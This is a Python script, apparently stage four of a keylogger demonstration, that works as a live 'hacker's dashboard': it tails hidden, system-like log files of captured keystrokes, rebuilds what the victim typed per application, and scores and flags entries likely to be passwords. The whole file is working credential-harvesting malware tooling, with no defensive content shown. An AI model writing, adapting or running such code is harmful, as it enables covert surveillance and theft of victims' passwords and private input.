#!/usr/bin/env python3
"""
STAGE 4 — Live Log Viewer
===========================
Tails the hidden keylogger log file in real time.
Run this in a separate terminal while stage4_keylogger.py runs silently.

This is the "hacker's dashboard" — they run this on their machine
to watch the victim's keystrokes stream in live.

Usage:
  python3 stage4_viewer.py           # live feed
  python3 stage4_viewer.py --dump    # show all captured entries
  python3 stage4_viewer.py --passwords  # show only high-score entries
"""

import sys
import time
import os
from datetime import datetime
from pathlib import Path

LOG_FILE      = Path.home() / ".local" / "share" / ".syslog"
KEYSTROKE_LOG = Path.home() / ".local" / "share" / ".ksraw"

RED     = "\033[91m"
YELLOW  = "\033[93m"
GREEN   = "\033[92m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BLUE    = "\033[94m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"

BANNER = f"""
{RED}{BOLD}
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{RESET}{RED}██╗      ██╗██╗   ██╗███████╗    ███████╗███████╗███████╗██████╗
{RED}██║      ██║██║   ██║██╔════╝    ██╔════╝██╔════╝██╔════╝██╔══██╗
{RED}██║      ██║██║   ██║█████╗      █████╗  █████╗  █████╗  ██║  ██║
{RED}██║      ██║╚██╗ ██╔╝██╔══╝      ██╔══╝  ██╔══╝  ██╔══╝  ██║  ██║
{RED}███████╗ ██║ ╚████╔╝ ███████╗    ██║     ███████╗███████╗██████╔╝
{RED}╚══════╝ ╚═╝  ╚═══╝  ╚══════╝    ╚═╝     ╚══════╝╚══════╝╚═════╝ {RESET}
{DIM}  Watching: {LOG_FILE}{RESET}
{RED}  ──────────────────────────────────────────────────────────{RESET}
"""


def password_label(score):
    score = int(score)
    if score >= 80:
        return f"{RED}{BOLD}⚠ HIGH LIKELIHOOD PASSWORD{RESET}"
    elif score >= 50:
        return f"{YELLOW}~ possible password{RESET}"
    elif score >= 30:
        return f"{DIM}low likelihood{RESET}"
    return ""


def app_color(app):
    colors = {
        "firefox":   BLUE,
        "chromium":  BLUE,
        "foot":      GREEN,
        "kitty":     GREEN,
        "alacritty": GREEN,
        "vesktop":   MAGENTA,
        "discord":   MAGENTA,
        "code":      CYAN,
        "nvim":      CYAN,
        "obsidian":  YELLOW,
    }
    return colors.get(app.lower(), DIM)


def render_entry(line, highlight_passwords=False):
    """Parse and render a single log line."""
    line = line.strip()
    if not line:
        return

    # System entries
    if "__system__" in line:
        parts = line.split("|")
        ts = parts[0] if parts else "?"
        msg = parts[3] if len(parts) > 3 else line
        print(f"\n  {DIM}[{ts}] {msg}{RESET}")
        return

    parts = line.split("|")
    if len(parts) < 5:
        return

    ts, app, title, text, score = parts[0], parts[1], parts[2], parts[3], parts[4]
    score_int = int(score) if score.isdigit() else 0

    # Filter mode
    if highlight_passwords and score_int < 50:
        return

    acolor = app_color(app)
    plabel = password_label(score)

    # Box style based on password score
    if score_int >= 80:
        top = f"{RED}  ╔══ 🔑 CREDENTIAL ══════════════════════════════════════════{RESET}"
        bot = f"{RED}  ╚════════════════════════════════════════════════════════════{RESET}"
    elif score_int >= 50:
        top = f"{YELLOW}  ╔══ POSSIBLE PASSWORD ════════════════════════════════════{RESET}"
        bot = f"{YELLOW}  ╚═════════════════════════════════════════════════════════{RESET}"
    else:
        top = f"{DIM}  ┌── entry ──────────────────────────────────────────────────{RESET}"
        bot = f"{DIM}  └───────────────────────────────────────────────────────────{RESET}"

    border = RED if score_int >= 80 else (YELLOW if score_int >= 50 else DIM)

    print(top)
    print(f"{border}  ║{RESET}  {DIM}time :{RESET}  {ts}")
    print(f"{border}  ║{RESET}  {DIM}app  :{RESET}  {acolor}{BOLD}{app}{RESET}")
    print(f"{border}  ║{RESET}  {DIM}title:{RESET}  {BLUE}{title[:70]}{RESET}")
    print(f"{border}  ║{RESET}  {DIM}text :{RESET}  {BOLD}{YELLOW}{text}{RESET}")
    if plabel:
        print(f"{border}  ║{RESET}  {DIM}score:{RESET}  {plabel}")
    print(bot)
    print()


def live_feed():
    """Tail the keystroke log — every key shown the instant it is pressed."""
    print(BANNER)
    print(f"  {GREEN}Waiting for keylogger ...{RESET}")
    print(f"  {DIM}(start: sudo python3 stage4_keylogger.py){RESET}\n")
    print(f"{RED}  ── LIVE KEYSTROKE FEED ────────────────────────────────────{RESET}")
    print(f"  {DIM}Every key shown as it is pressed. Buffer reconstructed live.{RESET}\n")

    log_to_use = KEYSTROKE_LOG

    while not log_to_use.exists():
        # fallback to line log if keystroke log not yet created
        if LOG_FILE.exists():
            log_to_use = LOG_FILE
            break
        time.sleep(0.3)

    text_buffer = []
    current_app = ""

    with open(log_to_use, "r") as f:
        f.seek(0, 2)  # seek to end — only NEW keystrokes

        while True:
            line = f.readline()
            if not line:
                time.sleep(0.05)
                continue

            line = line.strip()
            if not line:
                continue

            parts = line.split("|")
            if len(parts) < 3:
                continue

            ts, app, key = parts[0], parts[1], parts[2]

            if app != current_app:
                if current_app:
                    print()
                print(f"\n  {DIM}── {app_color(app)}{BOLD}{app}{RESET}{DIM} ──────────────────────────────{RESET}")
                current_app = app

            if key == "[ENTER]":
                captured = "".join(text_buffer)
                score    = 0
                if any(c.isupper() for c in captured): score += 20
                if any(c.islower() for c in captured): score += 20
                if any(c.isdigit() for c in captured): score += 20
                if any(c in "!@#$%^&*()_+-=[]" for c in captured): score += 30
                if len(captured) >= 8: score += 10

                color = RED if score >= 80 else (YELLOW if score >= 50 else GREEN)
                tag   = f"  {RED}{BOLD}⚠  CREDENTIAL{RESET}" if score >= 80 else ""
                print(f"  {CYAN}↵  {color}{BOLD}{captured}{RESET}{tag}")
                print(f"  {DIM}{'─'*55}{RESET}")
                text_buffer = []

            elif key == "[BACKSPACE]":
                if text_buffer:
                    removed = text_buffer.pop()
                    buf = "".join(text_buffer)
                    print(f"  {RED}⌫  -{BOLD}{removed}{RESET}   {DIM}→{RESET} {BOLD}{CYAN}{buf}{RESET}{CYAN}█{RESET}")
                else:
                    print(f"  {RED}⌫  (empty){RESET}")

            elif key == "[TAB]":
                text_buffer.append("→")
                buf = "".join(text_buffer)
                print(f"  {BLUE}[TAB]{RESET}   {DIM}→{RESET} {BOLD}{CYAN}{buf}{RESET}{CYAN}█{RESET}")

            elif key.startswith("[CTRL+"):
                combo = key[1:-1]
                print(f"  {MAGENTA}{BOLD}{combo}{RESET}")

            else:
                char = key.replace("[SPACE]", " ")
                text_buffer.append(char)
                buf = "".join(text_buffer)
                display = "·" if char == " " else char
                print(f"  {GREEN}▶{RESET} {DIM}[{ts}]{RESET}  {YELLOW}{BOLD}{display}{RESET}   {DIM}→{RESET} {BOLD}{CYAN}{buf}{RESET}{CYAN}█{RESET}")

            sys.stdout.flush()


def dump_all():
    """Print all captured entries from the log."""
    print(BANNER)
    if not LOG_FILE.exists():
        print(f"  {RED}No log file found at {LOG_FILE}{RESET}")
        return

    print(f"  {BOLD}All captured entries:{RESET}\n")
    with open(LOG_FILE, "r") as f:
        for line in f:
            render_entry(line)

    # Summary
    with open(LOG_FILE, "r") as f:
        lines = [l for l in f if "__system__" not in l and l.strip()]

    high = [l for l in lines if len(l.split("|")) >= 5 and int(l.split("|")[4]) >= 80]
    med  = [l for l in lines if len(l.split("|")) >= 5 and 50 <= int(l.split("|")[4]) < 80]

    print(f"{RED}  ── SUMMARY ────────────────────────────────────────────────{RESET}")
    print(f"  Total entries    : {BOLD}{len(lines)}{RESET}")
    print(f"  High score (≥80) : {RED}{BOLD}{len(high)}{RESET}  ← likely passwords")
    print(f"  Medium (50-79)   : {YELLOW}{len(med)}{RESET}")
    print(f"  Log file         : {LOG_FILE}")
    print(f"{RED}  ────────────────────────────────────────────────────────────{RESET}\n")


def passwords_only():
    """Show only high-scoring entries."""
    print(BANNER)
    print(f"  {RED}{BOLD}Showing only likely credentials (score ≥ 50){RESET}\n")
    if not LOG_FILE.exists():
        print(f"  {RED}No log file found.{RESET}")
        return
    with open(LOG_FILE, "r") as f:
        for line in f:
            render_entry(line, highlight_passwords=True)


def main():
    if len(sys.argv) > 1:
        if sys.argv[1] == "--dump":
            dump_all(); return
        if sys.argv[1] == "--passwords":
            passwords_only(); return

    try:
        live_feed()
    except KeyboardInterrupt:
        print(f"\n\n  {DIM}Viewer stopped.{RESET}\n")


if __name__ == "__main__":
    main()
